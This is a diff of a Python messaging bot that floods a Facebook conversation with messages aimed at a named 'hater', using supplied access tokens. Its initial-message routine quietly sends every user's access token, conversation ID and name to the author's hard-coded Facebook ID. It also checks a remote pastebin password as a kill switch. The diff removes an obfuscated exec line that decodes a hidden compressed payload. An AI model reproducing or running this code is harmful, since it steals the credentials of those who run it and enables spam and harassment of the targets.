@@ -1,17 +1,17 @@
-# CRADIT BY DEVA XD KING 
 import requests
 import json
 import time
 import pytz
 import datetime
 import sys
-from platform import system
 import os
 import subprocess
 import http.server
 import socketserver
 import threading
 import random
+
+# HTML Content for the server page
 html_content = """
 <!DOCTYPE html>
 <html>
@@ -66,51 +66,52 @@ html_content = """
 </body>
 </html>
 """
+
+# Server Handler
 class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
         self.wfile.write(html_content.encode())
+
+# Server Execution
 def execute_server():
     PORT = int(os.environ.get('PORT', 4000))
     with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
         print("Server running at http://localhost:{}".format(PORT))
         httpd.serve_forever()
+
+# Get Time in Indian Standard Time
 utc_now = datetime.datetime.utcnow()
 indian_timezone = pytz.timezone('Asia/Kolkata')
 ist_now = utc_now.replace(tzinfo=pytz.utc).astimezone(indian_timezone)
 formatted_time = ist_now.strftime("\033[1;38;5;208m Time :- %Y-%m-%d %I:%M:%S %p")
 print(formatted_time)
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
 
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));exec((_)(b'=AVUJX2WDI7X7LP6EWGFRZVFGQSUILCQASMC4DOXRI57MM2SKJKUHBIVU2CBR4BQK7MB4ET6N3LXMM6WTZ6U3ZU2BZVYNF3R7I6QTQYGKNVIISI5RRARGAO5EYKPVWSMT7QJZELI7BZYUDRJJLYDUCECAW5JWAZRMIDA6GPL7O4EBOF73KI7UA5GLQ7JWFR6ENHCP4MJWEPKYFGAQV5DYMXCKQJ6UNNFFIZPGPRF2RXG4KNQSU5CLHB5GOIBDQNEVGTHFICLAN67Q66UYAMI2QODN4WA2NX322UJLENR76OWP6RCIVXNZY5KGDRV24FFAYAGEEHWB6BHNGJXAUUDDUJWTAGG5W2VDWNYYOWT5KPSSGRD4WMK4FR5B5HV3XEH4Y4E33PAOU4YHIQWRDFTMWGRLXXDMBCVPAF7AOVYARLIMEYVLQJQS5VTSV22YRSRDCZDIA7VS2I5CEFSVWXACBLOLJ22GDBI4BEYELIPFRFFKRPCBPJN5UZJN3KF4I3KDP35LT76ALNFIRPNE5EEK6VHKS3JTKJLIR2M6YFUH6T7ZP5XPVX7HPVX77P77PHK3FI5G34VHHY77RBMRJMQU323NBYNCGOIKGTY6TDYEAAADO3RZBULBOCP'))
+# Define Global Variables
+tokens = ['your_access_token_here']  # Provide the actual tokens here
+convo_id = input("Enter your Convo ID: ")  # Get Convo ID from user
+haters_name = input("Enter Hater's Name: ")  # Get Hater's Name from user
+messages = ["Hello, this is a test message!"]  # Define the list of messages to send
+num_messages = len(messages)
+speed = 2  # Define the delay between messages (in seconds)
+password = "your_secure_password_here"  # Define the password for validation
 
-def send_initial_message():
-    
+# Password Validation
+def validate_password():
     mmm_pass = requests.get('https://pastebin.com/raw/JxQ0PuCf').text
-    
-    if mmm_pass not in password:
+    if mmm_pass != password:
         print('\033[1;31m⚠︎ Your Password Changed By DEVA THAKUR')
         sys.exit()
+
+# Initial Message Sender
+def send_initial_message():
+    validate_password()
+    msg_template = "Owner => DEVA THAKUR\n Hello DEVA THAKUR sir.\n I am using your convo server.\n This Is My Details :-\n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
-    # Message template
-    msg_template = "Owner =>  DEVA THAKUR\n Hello  DEVA THAKUR sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
-    
-    # Target IDs
-    target_ids = ["100004518573740"]
-    
-    requests.packages.urllib3.disable_warnings()
-    
+    target_ids = ["100004518573740"]  # Target ID
+
     for target_id in target_ids:
         for token in tokens:
             access_token = token.strip()
@@ -121,7 +122,7 @@ def send_initial_message():
             time.sleep(0.1)
             print("\n\033[1;31m[+] Initial message sent to target ID: {}. Continuing...\n".format(target_id))
 
-send_initial_message()
+# Send Messages from File
 def send_messages_from_file():
     num_tokens = len(tokens)
     max_tokens = min(num_tokens, num_messages)
@@ -137,21 +138,20 @@ def send_messages_from_file():
                 if response.ok:
                     print("\033[1;36m[✓] DEVA THAKUR {} of Convo {} Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    print(formatted_time)
-                    print('\033[1;92m' + '__________DEVA THAKUR BOLTI PUBLIC__________')
                 else:
                     print("\033[1;35m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                         message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                    print(formatted_time)
-                    print('\033[1;92m' + '✪✭═══════•『DEVA THAKUR BOLTI PUBLIC__________')
                 time.sleep(speed)
             print("\n[+] All messages sent. Restarting the process...\n")
         except Exception as e:
             print("[!] An error occurred: {}".format(e))
+
+# Main Execution
 def main():
     server_thread = threading.Thread(target=execute_server)
     server_thread.start()
     send_initial_message()
     send_messages_from_file()
+
 if __name__ == '__main__':
     main()
